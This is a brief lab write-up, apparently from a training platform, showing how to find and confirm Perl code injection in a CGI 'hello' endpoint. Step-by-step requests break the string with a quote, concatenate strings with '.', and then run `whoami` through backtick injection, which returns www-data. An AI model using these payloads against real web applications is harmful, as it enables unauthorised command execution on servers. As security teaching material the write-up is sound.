---
tags: perl
---
Let’s say we have an example web request like so:
```json
GET /cgi-bin/hello?name=hacker HTTP/1.1
Host: ptl-e86da4f3-4c35c938.libcurl.so
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://ptl-e86da4f3-4c35c938.libcurl.so/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

and we get a response like:
```json
HTTP/1.1 200 OK
Server: nginx/1.16.0
Date: Tue, 27 Jun 2023 17:48:47 GMT
Content-Type: application/json
Connection: close
Content-Length: 22

{"str":"Hello hacker"}
```

Now, we can test for the command injection by inserting a single (or double?) quote to the first line:

```request
GET /cgi-bin/hello?name=hacker' HTTP/1.1
```

and this is what changes in the response 🤔:

```json
{"str":""}
```

Let’s try concentrating together two strings with `.`

```request
GET /cgi-bin/hello?name=hacker'.'1337'.' HTTP/1.1
```

```json
{"str":"Hello hacker1337"}
```

Great, it works. Now, we can inject commands with either `exec` or `system` or by using **\`** . 

```request
GET /cgi-bin/hello?name=hacker'.`whoami`.' HTTP/1.1
```

```json
{"str":"Hello hackerwww-data"}
```

We can see that we are **www-data** and the command worked 😃

